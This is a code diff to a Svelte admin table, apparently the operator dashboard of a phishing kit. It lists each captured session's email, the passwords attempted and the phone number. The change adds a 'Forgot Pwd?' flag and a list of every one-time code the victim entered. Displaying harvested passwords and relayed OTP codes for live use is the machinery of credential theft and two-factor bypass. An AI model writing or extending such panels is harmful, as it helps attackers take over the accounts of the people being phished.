@@ -61,7 +61,8 @@
 								<th class="px-6 py-4 font-semibold text-gray-900">Email</th>
 								<th class="px-6 py-4 font-semibold text-gray-900">Passwords Attempted</th>
 								<th class="px-6 py-4 font-semibold text-gray-900">Phone</th>
-								<th class="px-6 py-4 font-semibold text-gray-900">OTP</th>
+								<th class="px-6 py-4 font-semibold text-gray-900">Forgot Pwd?</th>
+								<th class="px-6 py-4 font-semibold text-gray-900">OTP Attempts</th>
 							</tr>
 						</thead>
 						<tbody class="divide-y divide-gray-200 bg-white">
@@ -90,8 +91,25 @@
 									<td class="whitespace-nowrap px-6 py-4 text-gray-900">
 										{session.phone || '—'}
 									</td>
-									<td class="whitespace-nowrap px-6 py-4 font-mono font-medium tracking-widest text-brand-blue-600">
-										{session.otp || '—'}
+									<td class="whitespace-nowrap px-6 py-4 text-gray-900">
+										{#if session.forgotPasswordClicked}
+											<span class="inline-flex items-center rounded-md bg-yellow-50 px-2 py-1 text-xs font-medium text-yellow-800 ring-1 ring-inset ring-yellow-600/20">Yes</span>
+										{:else}
+											<span class="text-gray-400">No</span>
+										{/if}
+									</td>
+									<td class="px-6 py-4">
+										{#if session.otps}
+											<div class="flex flex-col gap-1">
+												{#each Object.values(session.otps) as code, i}
+													<span class="inline-flex w-fit items-center rounded-md bg-brand-blue-50 px-2 py-1 text-xs font-mono font-medium text-brand-blue-700 ring-1 ring-inset ring-brand-blue-600/20">
+														Attempt {i + 1}: {code}
+													</span>
+												{/each}
+											</div>
+										{:else}
+											<span class="text-gray-400">—</span>
+										{/if}
 									</td>
 								</tr>
 							{/each}
